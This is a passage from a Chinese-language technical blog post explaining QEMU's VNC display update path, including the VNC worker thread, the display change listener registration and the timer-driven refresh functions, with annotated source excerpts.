DisplayChangeListener 的 ops</span><br>    register_displaychangelistener(&amp;vd-&gt;dcl);<br>    vd-&gt;kbd = qkbd_state_init(vd-&gt;dcl.con);<br>&#125;<br></code></pre></td></tr></table></figure><p>大致流程如下：</p><ul><li>创建一个 VncDisplay，加入到全局链表中</li><li>初始化键盘布局</li><li>启动 VNC worker thread（若未启动），由 worker thread 将图像信息发送给 client</li><li>设置该 VncDisplay 对应的 DisplayChangeListener 的 ops 为 <code>dcl_ops</code></li><li>调用 <code>register_displaychangelistener()</code> 注册该 VncDisplay 对应的 DisplayChangeListener</li></ul><h3 id="I、VNC-worker-thread-将图像更新发送给客户端">I、VNC worker thread - 将图像更新发送给客户端</h3><p><code>vnc worker thread</code> 是 Qemu 中 VNC 服务中的一个重要的线程，其用以持续地处理挂载在全局的 VncJobQueue 上的 VncJob，并将图像更新数据发送给 vnc 客户端</p><p>在 <code>vnc_display_init()</code> 中创建 VncDisplay 实例时，其还会调用 <code>vnc_start_worker_thread()</code> 启动 vnc worker thread：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">vnc_worker_thread_running</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>; <span class="hljs-comment">/* Check global queue */</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_start_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    VncJobQueue *q;<br><br>    <span class="hljs-keyword">if</span> (vnc_worker_thread_running())<br>        <span class="hljs-keyword">return</span> ;<br><br>    q = vnc_queue_init();<br>    qemu_thread_create(&amp;q-&gt;thread, <span class="hljs-string">&quot;vnc_worker&quot;</span>, vnc_worker_thread, q,<br>                       QEMU_THREAD_DETACHED);<br>    <span class="hljs-built_in">queue</span> = q; <span class="hljs-comment">/* Set global queue */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该线程的本体便是 <code>vnc_worker_thread</code> 函数，主要就是一个重复调用 <code>vnc_worker_thread_loop</code> 的大循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">vnc_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    VncJobQueue *<span class="hljs-built_in">queue</span> = arg;<br><br>    qemu_thread_get_self(&amp;<span class="hljs-built_in">queue</span>-&gt;thread);<br><br>    <span class="hljs-keyword">while</span> (!vnc_worker_thread_loop(<span class="hljs-built_in">queue</span>)) ;<br>    vnc_queue_clear(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vnc_worker_thread_loop</code> 定义如下，该函数会一直等待到全局的 VncJobQueue 的 VncJob 链表非空，单次调用处理一个 VncJob：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_worker_thread_loop</span><span class="hljs-params">(VncJobQueue *<span class="hljs-built_in">queue</span>)</span><br>&#123;<br>    VncJob *job;<br>    VncRectEntry *entry, *tmp;<br>    VncState vs = &#123;&#125;;<br>    <span class="hljs-type">int</span> n_rectangles;<br>    <span class="hljs-type">int</span> saved_offset;<br><br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);  <span class="hljs-comment">// 等待全局 queue 不为空</span><br>    <span class="hljs-keyword">while</span> (QTAILQ_EMPTY(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs) &amp;&amp; !<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        qemu_cond_wait(&amp;<span class="hljs-built_in">queue</span>-&gt;cond, &amp;<span class="hljs-built_in">queue</span>-&gt;mutex);<br>    &#125;<br>    <span class="hljs-comment">/* Here job can only be NULL if queue-&gt;exit is true */</span><br>    job = QTAILQ_FIRST(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs);  <span class="hljs-comment">// 取下第一个 job</span><br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    assert(job-&gt;vs-&gt;magic == VNC_MAGIC);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    vnc_lock_output(job-&gt;vs);  <span class="hljs-comment">// 锁上 VncState</span><br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span> || job-&gt;vs-&gt;<span class="hljs-built_in">abort</span> == <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// io channel 为空或 abort 为真，断开连接</span><br>        vnc_unlock_output(job-&gt;vs);<br>        <span class="hljs-keyword">goto</span> disconnected;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (buffer_empty(&amp;job-&gt;vs-&gt;output)) &#123;<br>        <span class="hljs-comment">// 这里的 output 为 Buffer 类型，类似于 iovec，包含着长度与一个指向 buffer 的指针</span><br>        <span class="hljs-comment">// buffer_move_empty(*to, *from) 的作用就是释放 to 的 buffer，将 from 的 buffer 给到 to 的 buffer</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Looks like a NOP as it obviously moves no data.  But it</span><br><span class="hljs-comment">         * moves the empty buffer, so we don&#x27;t have to malloc a new</span><br><span class="hljs-comment">         * one for vs.output</span><br><span class="hljs-comment">         */</span><br>        buffer_move_empty(&amp;vs.output, &amp;job-&gt;vs-&gt;output);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>    <span class="hljs-comment">/* Make a local copy of vs and switch output buffers */</span><br>    vnc_async_encoding_start(job-&gt;vs, &amp;vs);<br>    vs.magic = VNC_MAGIC;<br><br>    <span class="hljs-comment">/* Start sending rectangles */</span><br>    n_rectangles = <span class="hljs-number">0</span>;<br>    vnc_write_u8(&amp;vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);<br>    vnc_write_u8(&amp;vs, <span class="hljs-number">0</span>);<br>    saved_offset = vs.output.offset;<br>    vnc_write_u16(&amp;vs, <span class="hljs-number">0</span>);<br><br>    vnc_lock_display(job-&gt;vs-&gt;vd);<br>    <span class="hljs-comment">// 遍历该 job 上的 VncRect，发送给 client</span><br>    QLIST_FOREACH_SAFE(entry, &amp;job-&gt;rectangles, next, tmp) &#123;<br>        <span class="hljs-type">int</span> n;<br><br>        <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// io channel 为空，断开连接</span><br>            vnc_unlock_display(job-&gt;vs-&gt;vd);<br>            <span class="hljs-comment">/* Copy persistent encoding data */</span><br>            vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>            <span class="hljs-keyword">goto</span> disconnected;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vnc_worker_clamp_rect(&amp;vs, job, &amp;entry-&gt;rect)) &#123;<br>            <span class="hljs-comment">// 发送 buffer</span><br>            n = vnc_send_framebuffer_update(&amp;vs, entry-&gt;rect.x, entry-&gt;rect.y,<br>                                            entry-&gt;rect.w, entry-&gt;rect.h);<br><br>            <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">0</span>) &#123;<br>                n_rectangles += n;<br>            &#125;<br>        &#125;<br>        g_free(entry);<br>    &#125;<br>    trace_vnc_job_nrects(&amp;vs, job, n_rectangles);<br>    vnc_unlock_display(job-&gt;vs-&gt;vd);<br><br>    <span class="hljs-comment">/* Put n_rectangles at the beginning of the message */</span><br>    vs.output.buffer[saved_offset] = (n_rectangles &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    vs.output.buffer[saved_offset + <span class="hljs-number">1</span>] = n_rectangles &amp; <span class="hljs-number">0xFF</span>;<br><br>    vnc_lock_output(job-&gt;vs);<br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc != <span class="hljs-literal">NULL</span>) &#123;<br>        buffer_move(&amp;job-&gt;vs-&gt;jobs_buffer, &amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br><br>        qemu_bh_schedule(job-&gt;vs-&gt;bh);<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>        buffer_reset(&amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>disconnected:<br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);<br>    QTAILQ_REMOVE(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs, job, next);<br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    qemu_cond_broadcast(&amp;<span class="hljs-built_in">queue</span>-&gt;cond);<br>    g_free(job);<br>    vs.magic = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数的流程如下：</p><ul><li>检查全局 queue 的 job 链表是否为空，若是则进入睡眠等待</li><li>锁上第一个 job，检查对应 VncState 的 IO channel 是否为空，若是则跳到结束发送</li><li>若 VncState 的 output buffer （Buffer 类型，类似于 iovec，有长度和指向实际 buffer 的指针）的 offset 为 0，则将其给到函数内临时创建的 VncState 的 output buffer，原 buffer 设为 NULL</li><li>遍历该 job 上的 VncRect，发送给 client，若 io channel 为空，则跳到结束发送</li><li>若 VncState 的 io channel 不为空，则将函数内临时创建的 VncState 的 output buffer 给回原 VncState</li><li>（结束发送）从全局 queue 上取下该 job 并释放</li></ul><h3 id="II、VNC-的-dcl-ops">II、VNC 的 dcl_ops</h3><p>在 <code>vnc_display_init()</code> 中创建 VncDisplay 实例时会将其 DisplayChangeListener 的函数表初始化为 <code>dcl_ops</code> 函数表，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> DisplayChangeListenerOps dcl_ops = &#123;<br>    .dpy_name             = <span class="hljs-string">&quot;vnc&quot;</span>,<br>    .dpy_refresh          = vnc_refresh,<br>    .dpy_gfx_update       = vnc_dpy_update,<br>    .dpy_gfx_switch       = vnc_dpy_switch,<br>    .dpy_gfx_check_format = qemu_pixman_check_format,<br>    .dpy_mouse_set        = vnc_mouse_set,<br>    .dpy_cursor_define    = vnc_dpy_cursor_define,<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其中主要都是与 vnc 相关的操作函数，后面涉及到具体函数时我们再展开分析</p><h3 id="III、register-displaychangelistener-注册-dcl，启动-timer">III、register_displaychangelistener - 注册 dcl，启动 timer</h3><p>该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_displaychangelistener</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    QemuConsole *con;<br><br>    assert(!dcl-&gt;ds);<br><br>    trace_displaychangelistener_register(dcl, dcl-&gt;ops-&gt;dpy_name);<br>    dcl-&gt;ds = get_alloc_displaystate();<br>    QLIST_INSERT_HEAD(&amp;dcl-&gt;ds-&gt;listeners, dcl, next);<br>    gui_setup_refresh(dcl-&gt;ds);<br>    <span class="hljs-keyword">if</span> (dcl-&gt;con) &#123;<br>        dcl-&gt;con-&gt;dcls++;<br>        con = dcl-&gt;con;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        con = active_console;<br>    &#125;<br>    displaychangelistener_display_console(dcl, con, dcl-&gt;con ? &amp;error_fatal : <span class="hljs-literal">NULL</span>);<br>    text_console_update_cursor(<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要做了这些事情：</p><ul><li>将 dcl 插到对应 DisplayState 的 listeners 链表上</li><li>调用 <code>gui_setup_refresh()</code> 启动一个 Qemu Timer</li><li>调用 <code>displaychangelistener_display_console()</code> 进行相关初始化操作，其中会调用 <code>dcl-&gt;ops</code> 中函数</li></ul><p>我们主要关注 <code>gui_setup_refresh()</code>，其会启动一个 Qemu 定时器，定期地刷新 frame buffer，这也是更新显卡数据的核心：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_setup_refresh</span><span class="hljs-params">(DisplayState *ds)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">bool</span> need_timer = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_gfx = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_text = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh != <span class="hljs-literal">NULL</span>) &#123;<br>            need_timer = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_gfx = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_text_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_text = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (need_timer &amp;&amp; ds-&gt;gui_timer == <span class="hljs-literal">NULL</span>) &#123;<br>        ds-&gt;gui_timer = timer_new_ms(QEMU_CLOCK_REALTIME, gui_update, ds);<br>        timer_mod(ds-&gt;gui_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!need_timer &amp;&amp; ds-&gt;gui_timer != <span class="hljs-literal">NULL</span>) &#123;<br>        timer_free(ds-&gt;gui_timer);<br>        ds-&gt;gui_timer = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    ds-&gt;have_gfx = have_gfx;<br>    ds-&gt;have_text = have_text;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 dcl-&gt;ops 的 <code>dpy_refresh</code> 指针非空<strong>且当前 DisplayState 未设置 timer 时</strong>，便会调用 <code>timer_new_ms()</code> 新建一个毫秒级别的定时器，定时调用 <code>gui_update()</code> 刷新显存，接收的参数便为该 DisplayState</p><h1>0x03.显示设备更新相关函数</h1><p>前面我们讲到，在 Qemu 启动时会启动一个 Timer 定时进行显存的刷新，其代码调用关系如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p><h2 id="一、gui-update-timer-定时调用进行更新操作">一、gui_update - timer 定时调用进行更新操作</h2><p>我们先来看 <code>gui_update()</code> 这个由 timer 定时调用的函数，其定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_update</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> interval = GUI_REFRESH_INTERVAL_IDLE;<br>    <span class="hljs-type">uint64_t</span> dcl_interval;<br>    DisplayState *ds = opaque;<br>    DisplayChangeListener *dcl;<br>    QemuConsole *con;<br><br>    ds-&gt;refreshing = <span class="hljs-literal">true</span>;<br>    dpy_refresh(ds);<br>    ds-&gt;refreshing = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        dcl_interval = dcl-&gt;update_interval ?<br>            dcl-&gt;update_interval : GUI_REFRESH_INTERVAL_DEFAULT;<br>        <span class="hljs-keyword">if</span> (interval &gt; dcl_interval) &#123;<br>            interval = dcl_interval;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ds-&gt;update_interval != interval) &#123;<br>        ds-&gt;update_interval = interval;<br>        QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>            <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;update_interval) &#123;<br>                con-&gt;hw_ops-&gt;update_interval(con-&gt;hw, interval);<br>            &#125;<br>        &#125;<br>        trace_console_refresh(interval);<br>    &#125;<br>    ds-&gt;last_update = qemu_clock_get_ms(QEMU_CLOCK_REALTIME);<br>    timer_mod(ds-&gt;gui_timer, ds-&gt;last_update + interval);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要流程如下：</p><ul><li>调用 <code>dpy_refresh()</code> ，该函数会遍历 DisplayState 中的所有 DisplayChangeListener 并调用 <code>dcl-&gt;ops-&gt;dpy_refresh()</code></li><li>遍历 DisplayState 中的所有 DisplayChangeListener，检查 <code>dcl-&gt;update_interval</code></li><li>若 <code>ds-&gt;update_interval != interval</code>，遍历所有的 QemuConsole 并调用 <code>con-&gt;hw_ops-&gt;update_interval()</code> 进行硬件数据更新</li></ul><h2 id="二、dpy-refresh-遍历-dcl-并调用-dcl-ops-dpy-refresh-进行更新">二、dpy_refresh - 遍历 dcl 并调用 dcl-&gt;ops-&gt;dpy_refresh 进行更新</h2><p><code>dpy_refresh()</code> 比较简单，主要就是遍历 DisplayState 中的所有 DisplayChangeListener 并调用 <code>dcl-&gt;ops-&gt;dpy_refresh()</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dpy_refresh</span><span class="hljs-params">(DisplayState *s)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br><br>    QLIST_FOREACH(dcl, &amp;s-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh) &#123;<br>            dcl-&gt;ops-&gt;dpy_refresh(dcl);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们主要关注与 VNC 有关的部分，对于 VNC 而言，其 <code>dcl-&gt;ops-&gt;dpy_refresh</code> 应为 <code>vnc_refresh</code>，该函数定义于 <code>ui/vnc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vnc_refresh</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);<br>    VncState *vs, *vn;<br>    <span class="hljs-type">int</span> has_dirty, rects = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (QTAILQ_EMPTY(&amp;vd-&gt;clients)) &#123;   <span class="hljs-comment">// 没有 client，直接返回</span><br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_MAX);   <span class="hljs-comment">//更新计时</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    graphic_hw_update(vd-&gt;dcl.con); <span class="hljs-comment">// 硬件更新</span><br><br>    <span class="hljs-keyword">if</span> (vnc_trylock_display(vd)) &#123;<br>        update_displaychangelistener(&amp;vd-&gt;dcl, VNC_REFRESH_INTERVAL_BASE);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    has_dirty = vnc_refresh_server_surface(vd); <span class="hljs-comment">// 检查是否有待更新数据</span><br>    vnc_unlock_display(vd);<br><br>    QTAILQ_FOREACH_SAFE(vs, &amp;vd-&gt;clients, next, vn) &#123;<br>        rects += vnc_update_client(vs, has_dirty);  <span class="hljs-comment">// 遍历更新 client</span><br>        <span class="hljs-comment">/* vs might be free()ed here */</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (has_dirty &amp;&amp; rects) &#123;<br>        vd-&gt;dcl.update_interval /= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &lt; VNC_REFRESH_INTERVAL_BASE) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_BASE;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;dcl.update_interval += VNC_REFRESH_INTERVAL_INC;<br>        <span class="hljs-keyword">if</span> (vd-&gt;dcl.update_interval &gt; VNC_REFRESH_INTERVAL_MAX) &#123;<br>            vd-&gt;dcl.update_interval = VNC_REFRESH_INTERVAL_MAX;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要流程如下：</p><ul><li>检查是否有连接的客户端，若否则更新计时后直接返回</li><li>调用 <code>graphic_hw_update()</code> 更新 dcl 对应的 QemuConsole 对应的硬件设备</li><li>调用 <code>vnc_refresh_server_surface()</code> 检查是否有 dirty 区域（待更新区域）</li><li>遍历 dcl 上的 client， 调用 <code>vnc_update_client()</code> 创建新的 VncJob 挂载到全局链表上，由 worker thread 进行推送</li></ul><h2 id="三、graphic-hw-update-图形硬件数据更新">三、graphic_hw_update - 图形硬件数据更新</h2><p>前面我们涉及到的都是 console、vnc 这一块的数据更新，并没有触及到实际的硬件方面（qemu 模拟显卡等）的更新，这一块实际的更新是由 <code>graphic_hw_update()</code> 来完成的，该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">graphic_hw_update</span><span class="hljs-params">(QemuConsole *con)</span><br>&#123;<br>    <span class="hljs-type">bool</span> async = <span class="hljs-literal">false</span>;<br>    con = con ? con : active_console;<br>    <span class="hljs-keyword">if</span> (!con) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;gfx_update) &#123;<br>        con-&gt;hw_ops-&gt;gfx_update(con-&gt;hw);<br>        async = con-&gt;hw_ops-&gt;gfx_update_async;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!async) &#123;<br>        graphic_hw_update_done(con);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面我们讲到一个 QemuConsole 对应一个显示设备，因此在 <code>graphic_hw_update()</code> 当中会直接调用 <code>con-&gt;hw_ops-&gt;gfx_update()</code> 来完成硬件方面的数据更新</p><p>如果是纯字符型显示设备，则为 <code>text_console_ops</code>，定义于 <code>ui/console.c</code> 中，该函数表没有 <code>gfx_update</code> 指针，故会直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> GraphicHwOps text_console_ops = &#123;<br>    .invalidate  = text_console_invalidate,<br>    .text_update = text_console_update,<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于默认的图形化界面，<code>con-&gt;hw-&gt;ops</code> 